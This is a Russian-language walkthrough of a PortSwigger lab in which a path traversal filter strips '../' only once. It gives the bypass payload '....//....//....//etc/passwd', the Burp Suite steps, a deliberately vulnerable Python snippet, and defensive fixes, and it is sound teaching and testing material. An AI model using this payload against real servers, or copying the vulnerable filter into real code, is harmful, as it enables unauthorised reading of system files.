<a id="goal"></a>

## 🎯 Цель

Использовать уязвимость **File Path Traversal** в механизме отображения изображений товаров и получить содержимое системного файла:

```text
/etc/passwd
```

Приложение удаляет стандартные traversal-последовательности:

```text
../
```

Однако удаление выполняется только один раз и не применяется повторно к уже изменённой строке.

Для обхода фильтра необходимо передать в параметр:

```text
filename
```

следующее значение:

```text
....//....//....//etc/passwd
```

После однократного удаления вложенных `../` последовательностей сервер получает рабочий путь:

```text
../../../etc/passwd
```

<a id="theory"></a>

## 🧠 Краткая теория

**Path Traversal** — это уязвимость, при которой пользователь может влиять на путь к файлу, читаемому сервером.

Приложение ожидает обычное имя изображения:

```text
filename=58.jpg
```

Сервер может формировать путь примерно так:

```text
/var/www/images/58.jpg
```

При отсутствии корректной проверки атакующий пытается передать:

```text
../../../etc/passwd
```

Последовательность:

```text
../
```

означает переход на один каталог выше.

В этой лаборатории разработчик попытался защититься, удаляя `../` из пользовательского ввода. Проблема в том, что фильтрация выполняется **не рекурсивно**.

Из-за этого специально сформированная строка после первого прохода фильтра превращается в новую traversal-последовательность.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Обычный payload:

```text
../../../etc/passwd
```

может быть обработан фильтром так:

```text
../../../etc/passwd
        ↓ удалить ../
etc/passwd
```

То есть прямые traversal-последовательности исчезают.

Вместо этого используется вложенная конструкция:

```text
....//
```

Внутри неё находится последовательность:

```text
../
```

После удаления только внутреннего совпадения остаётся:

```text
../
```

Таким образом:

```text
....//....//....//etc/passwd
```

после однократной фильтрации превращается в:

```text
../../../etc/passwd
```

И уже этот путь используется файловой системой сервера.

---

<a id="path-traversal"></a>

## 📁 Что такое Path Traversal

Path Traversal также называют:

```text
Directory Traversal
```

или:

```text
dot-dot-slash attack
```

Основная последовательность для Linux/Unix:

```text
../
```

Для Windows также может использоваться:

```text
..\
```

Назначение `../`:

```text
перейти в родительский каталог
```

Пример исходного каталога:

```text
/var/www/images/
```

После одного перехода:

```text
/var/www/
```

После двух:

```text
/var/
```

После трёх:

```text
/
```

Затем можно обратиться к:

```text
/etc/passwd
```

Итоговый путь:

```text
/var/www/images/../../../etc/passwd
```

после нормализации превращается в:

```text
/etc/passwd
```

<a id="non-recursive"></a>

## 🧹 Что означает non-recursive stripping

Термин:

```text
traversal sequences stripped non-recursively
```

означает, что приложение удаляет запрещённую последовательность только в рамках одного прохода.

Упрощённый пример:

```python
filename = filename.replace("../", "")
```

Если вход содержит:

```text
../etc/passwd
```

результат будет:

```text
etc/passwd
```

Но если вход содержит:

```text
....//etc/passwd
```

однократное удаление внутреннего `../` даёт:

```text
../etc/passwd
```

Приложение не запускает фильтр повторно, поэтому вновь образовавшаяся последовательность остаётся.

Рекурсивная обработка выглядела бы примерно так:

```python
while "../" in filename:
    filename = filename.replace("../", "")
```

Но даже рекурсивное удаление строк не является надёжной защитой. Правильная защита должна проверять итоговый нормализованный путь.

<a id="payload-building"></a>

## 🔬 Как формируется рабочий payload

Рассмотрим одну часть:

```text
....//
```

Её можно представить как наложенные друг на друга символы:

```text
.. + ../ + /
```

Фильтр находит внутри строку:

```text
../
```

и удаляет её один раз.

До фильтрации:

```text
....//
```

После удаления внутреннего `../`:

```text
../
```

Для выхода на три каталога выше используются три такие конструкции:

```text
....//....//....//
```

После фильтрации:

```text
../../../
```

После добавления целевого файла:

```text
....//....//....//etc/passwd
```

результат обработки:

```text
../../../etc/passwd
```

<a id="images"></a>

## 🗂 Как приложение загружает изображения

Лаборатория содержит уязвимость в функции отображения изображений товаров.

Когда пользователь открывает страницу товара, браузер отправляет отдельный запрос за изображением.

Пример:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Параметр:

```text
filename
```

указывает серверу, какой файл необходимо прочитать.

Предположительно приложение использует каталог:

```text
/var/www/images/
```

Для нормального значения:

```text
58.jpg
```

формируется:

```text
/var/www/images/58.jpg
```

Для вредоносного значения после слабой фильтрации формируется:

```text
/var/www/images/../../../etc/passwd
```

Файловая система нормализует этот путь до:

```text
/etc/passwd
```

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика фильтрации

Упрощённая уязвимая реализация может выглядеть так:

```python
filename = request.args["filename"]
filename = filename.replace("../", "")
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

Разработчик предполагает, что удаление:

```text
../
```

предотвращает выход из каталога изображений.

Но вход:

```text
....//....//....//etc/passwd
```

после одного прохода превращается в:

```text
../../../etc/passwd
```

Далее приложение объединяет его с базовым каталогом:

```text
/var/www/images/../../../etc/passwd
```

и читает системный файл.

Уязвимая схема:

```text
User-controlled filename
        ↓
Однократное удаление ../
        ↓
Появление новых ../
        ↓
Конкатенация с каталогом изображений
        ↓
Нормализация файловой системой
        ↓
Чтение /etc/passwd
```

## 🔍 Шаг 1 — Найти запрос изображения

1. Открыть лабораторию.
2. Перейти на страницу любого товара.
3. Запустить Burp Suite.
4. Открыть:

```text
Proxy → HTTP history
```

5. Найти запрос, загружающий изображение товара.

Обычно он выглядит так:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Главный объект тестирования:

```text
filename=58.jpg
```

<a id="step2"></a>

## 🔍 Шаг 2 — Отправить запрос в Repeater

На найденном запросе выполнить:

```text
Right click → Send to Repeater
```

Перейти во вкладку:

```text
Repeater
```

Burp Repeater позволяет:

- изменять значение `filename`;
- повторно отправлять запрос;
- сравнивать статус ответа;
- анализировать длину ответа;
- просматривать тело ответа;
- проверять, вернулся ли другой файл.

## 🔍 Шаг 3 — Проверить обычный traversal

Сначала можно заменить обычное имя изображения:

```text
58.jpg
```

на стандартный payload:

```text
../../../etc/passwd
```

Запрос:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Приложение удаляет traversal-последовательности, поэтому обычный вариант не приводит к чтению файла.

Это указывает на наличие фильтрации, но ещё не доказывает, что реализация безопасна.

Следующий вопрос пентестера:

```text
Выполняется ли удаление рекурсивно?
```

<a id="step5"></a>

## 🔍 Шаг 5 — Прочитать `/etc/passwd`

В HTTP-ответе вместо данных изображения появляется содержимое системного файла.

Характерные строки:


Это подтверждает, что сервер прочитал:

```text
/etc/passwd
```

```text
Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Уязвимость возникла из-за сочетания нескольких ошибок.

### 1. Пользователь контролирует имя файла

Параметр:

```text
filename
```

передаётся клиентом.

### 2. Значение используется при построении пути

Сервер добавляет пользовательское значение к каталогу изображений.

### 3. Защита основана на удалении строки

Приложение пытается удалить:

```text
../
```

вместо проверки итогового пути.

### 4. Удаление выполняется один раз

После первого прохода фильтра возникают новые traversal-последовательности.

### 5. Итоговый путь не проверяется

Приложение не проверяет, что нормализованный путь остаётся внутри каталога изображений.

### 6. Процесс приложения имеет право читать файл

Веб-приложение может прочитать `/etc/passwd`, поэтому файл возвращается пользователю.

<a id="transformation"></a>

## 🧭 Как `....//` превращается в `../`

Исходная строка:

```text
....//
```

Разметим символы:

```text
. . . . / /
```

Внутри находится совпадение:

```text
    ../
```

После удаления одного совпадения остаются:

```text
../
```

Для полного payload:

```text
....//....//....//etc/passwd
```

преобразование выглядит так:

```text
....//  →  ../
....//  →  ../
....//  →  ../
```

Результат:

```text
../../../etc/passwd
```

Затем:

```text
/var/www/images/../../../etc/passwd
```

нормализуется до:

```text
/etc/passwd
```

<a id="passwd"></a>

## 🐧 Почему используется `/etc/passwd`

`/etc/passwd` — стандартный файл Linux/Unix.

Он содержит информацию о локальных учётных записях.

Формат строки:

```text
username:x:UID:GID:comment:home:shell
```

Пример:

```text
root:x:0:0:root:/root:/bin/bash
```

Поля означают:

```text
root        имя пользователя
x           пароль хранится не здесь
0           UID
0           GID
root        описание
/root       домашний каталог
/bin/bash   командная оболочка
```

Важно:

```text
/etc/passwd обычно не содержит хеши паролей
```

Современные Linux-системы обычно хранят хеши в:

```text
/etc/shadow
```

который доступен только привилегированным процессам.

В лаборатории `/etc/passwd` используется как безопасное доказательство произвольного чтения файлов.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Если приложение принимает имя файла, необходимо проверить не только обычный `../`, но и способы обхода фильтра.

Полезные вопросы:

```text
Удаляется ли ../ или запрос полностью блокируется?
```

```text
Фильтрация выполняется один раз или повторяется?
```

```text
Проверяется ли URL-кодирование?
```

```text
Можно ли использовать абсолютный путь?
```

```text
Можно ли использовать обратный слеш?
```

```text
Проверяется ли итоговый канонический путь?
```

Параметры, которые стоит тестировать:

```text
file
filename
path
document
template
page
image
download
folder
```

Общий подход:

```text
1. Найти параметр, связанный с файлом
2. Определить нормальное значение
3. Проверить ../
4. Проанализировать реакцию фильтра
5. Попробовать вложенные последовательности
6. Попробовать кодирование
7. Сравнить status, body, length и Content-Type
8. Проверить содержимое ответа
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Изменять запрос страницы товара

Уязвимость находится в отдельном запросе изображения:

```http
GET /image?filename=...
```

### Ошибка 2. Изменять не тот параметр

Нужен параметр:

```text
filename
```

### Ошибка 3. Продолжать использовать обычный `../`

Прямые последовательности удаляются фильтром.

Рабочий обход:

```text
....//
```

### Ошибка 4. Использовать недостаточно переходов

Для данной лаборатории используется три перехода:

```text
....//....//....//
```

### Ошибка 5. Пропустить имя целевого файла

Полный payload:

```text
....//....//....//etc/passwd
```

### Ошибка 6. Добавить лишний ведущий слеш

Правильный payload начинается с:

```text
....//
```

а не с:

```text
/....//
```

### Ошибка 7. Смотреть только на HTTP status

Успешный и неуспешный запросы могут оба возвращать `200 OK`.

Нужно анализировать тело ответа.

### Ошибка 8. Ожидать JPEG

После эксплуатации сервер возвращает текст `/etc/passwd`, а не изображение.

### Ошибка 9. Не отправить запрос после изменения

После редактирования необходимо нажать:

```text
Send
```

### Ошибка 10. Считать удаление `../` полноценной защитой

Фильтрация строк не заменяет проверку нормализованного пути.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать путь от пользователя

Вместо имени файла передавать идентификатор:

```text
image_id=58
```

На сервере использовать таблицу соответствий:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Использовать allowlist

Разрешать только заранее известные имена файлов.

Пример строгой проверки:

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Нормализовать итоговый путь

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
```

### 4. Проверять принадлежность базовой директории

```python
if not target.startswith(base + os.sep):
    reject_request()
```

### 5. Не полагаться на `replace()`

Недостаточная защита:

```python
filename = filename.replace("../", "")
```

Она допускает обходы и не учитывает все варианты представления пути.

### 6. Использовать basename только как дополнительную меру

```python
filename = os.path.basename(user_input)
```

Это полезно, но не должно быть единственной защитой.

### 7. Применять минимальные права

Процесс веб-приложения должен иметь доступ только к необходимым файлам.

### 8. Не раскрывать подробные ошибки

Ошибки не должны показывать:

- абсолютные пути;
- структуру каталогов;
- имена внутренних файлов;
- stack trace.

### 9. Логировать подозрительные значения

Примеры:

```text
../
....//
..\
%2e%2e%2f
%252e%252e%252f
```

Логирование помогает обнаруживать атаки, но не заменяет корректную валидацию.

<a id="conclusion"></a>

## 🧾 Итог

Приложение пыталось предотвратить Path Traversal, удаляя последовательности:

```text
../
```

Однако фильтрация выполнялась только один раз.

Payload:

```text
....//....//....//etc/passwd
```

после однократной обработки превращался в:

```text
../../../etc/passwd
```

Это позволило выйти из каталога изображений и прочитать:

```text
/etc/passwd
```

Главные выводы:

```text
Удаление опасной подстроки не является надёжной защитой.
```

```text
Фильтры необходимо проверять на повторное появление опасных последовательностей.
```

```text
Безопасность должна основываться на нормализации и проверке итогового пути.
```

```text
Нормализованный путь обязан оставаться внутри разрешённой базовой директории.
```
